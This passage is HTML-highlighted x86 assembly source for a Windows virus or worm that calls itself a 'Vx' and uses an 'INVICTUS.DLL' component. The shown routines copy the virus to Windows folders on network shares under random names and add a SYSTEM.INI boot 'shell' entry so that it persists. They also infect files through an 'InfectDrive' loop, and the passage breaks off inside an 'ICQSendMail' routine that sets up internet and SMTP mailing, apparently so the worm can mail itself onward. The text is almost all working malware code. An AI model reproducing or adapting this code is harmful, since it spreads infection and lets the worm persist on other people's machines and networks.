            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">)+</span><span class="sc2">4</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">netpath</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WinDrive</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\WIN'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'\WIN2000'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'\WIN2K'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'\WINNT'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'\WINDOWS'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc12">'\WINXP'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">WinDrive</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">

</span><span class="sc5">HunterLoop</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">netpath</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">netpath2</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">netpath2</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">netpath2</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">NetEXE</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">netpath2</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrlenA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">netpath2</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">std</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'\'
</span><span class="sc0">            </span><span class="sc6">repne</span><span class="sc0"> </span><span class="sc6">scasb</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">HunterLoop</span><span class="sc0">
            </span><span class="sc6">popad</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">4</span><span class="sc4">*</span><span class="sc2">1</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">NetEXE</span><span class="sc0">      </span><span class="sc9">PROC</span><span class="sc0">
            </span><span class="sc5">ARG</span><span class="sc0">   </span><span class="sc5">NetName</span><span class="sc4">:</span><span class="sc10">DWORD</span><span class="sc0"> </span><span class="sc4">=</span><span class="sc0"> </span><span class="sc5">arg_netexe_len</span><span class="sc0">

</span><span class="sc5">DATASEG</span><span class="sc0">
            </span><span class="sc5">ForeignName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">SystemName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">RandomName</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">CODESEG</span><span class="sc0">
            </span><span class="sc6">pushad</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ForeignName</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NetName</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0f0f0f00h</span><span class="sc0">
            </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc13">'AAA\'
</span><span class="sc0">
            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RandomName</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ecx</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TheVxName</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CopyFailed</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NetName</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">OverIVCT</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\INVICTUS.DLL'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OverIVCT</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">DLLPath</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">CopyFailed</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">SystemName</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NetName</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

            </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">RandomName</span><span class="sc0">
            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">;  '\'</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">AddRND</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SystemSTR</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'\SYSTEM.INI'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SystemSTR</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcatA</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">explorerSTR</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'Explorer.exe '</span><span class="sc0">
</span><span class="sc5">AddRND</span><span class="sc0">      </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">explorerSTR</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">KeyName</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'shell'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">KeyName</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">SectionName</span><span class="sc0">
            </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'boot'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">SectionName</span><span class="sc4">:</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">WritePrivateProfileStringA</span><span class="sc0">

            </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ForeignName</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">OutputDebugStringA</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
            </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">CopyFailed</span><span class="sc4">:</span><span class="sc0"> </span><span class="sc6">popad</span><span class="sc0">
            </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc5">NetEXE</span><span class="sc0">      </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">InfectDrive</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

   </span><span class="sc5">DATASEG</span><span class="sc0">
            </span><span class="sc5">TmIndex</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">TmElement</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
   </span><span class="sc5">CODESEG</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad3</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'STARTING MODULO TMAPI'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ErrorTmapi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InitTmTable</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">TmIndex</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">NextIndex</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TmElement</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">TmIndex</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetTmElementByIndex</span><span class="sc0">

            </span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">EndIndex</span><span class="sc0">

            </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc5">TmIndex</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ivct</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TheVxName</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'EXE.'</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">TmElement</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">InfectFile</span><span class="sc0">

            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">NextIndex</span><span class="sc0">

</span><span class="sc5">ErrorTmapi</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">EndIndex</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc5">FreeTMAPI</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CloseTmTable</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad2</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'OUT MODULO TMAPI'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">InfectDrive</span><span class="sc0"> </span><span class="sc9">ENDP</span><span class="sc0">

</span><span class="sc5">ICQSendMail</span><span class="sc0"> </span><span class="sc9">PROC</span><span class="sc0">

</span><span class="sc5">DATASEG</span><span class="sc0">
            </span><span class="sc5">ICQInetOpenHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">ICQInetUrlHandle</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">BytesToDownload</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">BytesInternetRead</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">PointerEmailBuff1</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">PointerEmailBuff2</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">EmailToSmtpIndex</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">EMAILSocket</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
            </span><span class="sc5">Folder</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">rcpt</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">From</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">260</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">recvBuff</span><span class="sc0"> </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">532</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">CODESEG</span><span class="sc0">

   </span><span class="sc5">DATASEG</span><span class="sc0">
            </span><span class="sc5">BufferInternetRead</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">17</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">EmailEntryList</span><span class="sc0">       </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">02</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">ServerSMTP</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">60</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc5">lpWSADATA</span><span class="sc0">            </span><span class="sc5">WSADATA</span><span class="sc4">&lt;</span><span class="sc10">?</span><span class="sc4">&gt;</span><span class="sc0">
   </span><span class="sc5">CODESEG</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
            </span><span class="sc5">SendDebug</span><span class="sc0"> </span><span class="sc5">ad549</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'STARTING MODULO ICQSENDMAIL'</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

   </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">SEH</span><span class="sc0">
            </span><span class="sc6">pushad</span><span class="sc0">
            </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">ErrorIcq</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esp</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">EndIcqSMail</span><span class="sc0">
</span><span class="sc5">ErrorIcq</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">]</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">fs</span><span class="sc4">:[</span><span class="sc2">0</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">EMAILSocket</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc1">;jmp cp_test_ini</span><span class="sc0">

</span><span class="sc5">ICQNow</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">GetTickCount</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KeywordArray</span><span class="sc0">
            </span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">15</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+(</span><span class="sc8">eax</span><span class="sc4">*</span><span class="sc2">4</span><span class="sc4">)]</span><span class="sc0">

            </span><span class="sc9">IFDEF</span><span class="sc0"> </span><span class="sc5">DBG</span><span class="sc0">
   </span><span class="sc6">pushad</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">OutputDebugStringA</span><span class="sc0">
   </span><span class="sc6">popad</span><span class="sc0">
            </span><span class="sc9">ENDIF</span><span class="sc0">

            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">KeyWord</span><span class="sc0">
            </span><span class="sc5">callx</span><span class="sc0"> </span><span class="sc5">lstrcpyA</span><span class="sc0">

            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EmailEntryList</span><span class="sc0">
            </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
            </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">((</span><span class="sc2">02</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc0"> </span><span class="sc2">1024</span><span class="sc4">)</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc2">20</span><span class="sc4">)</span><span class="sc0">
            </span><span class="sc6">cld</span><span class="sc0">
            </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
            </span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosb</span><span class="sc0">
            </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

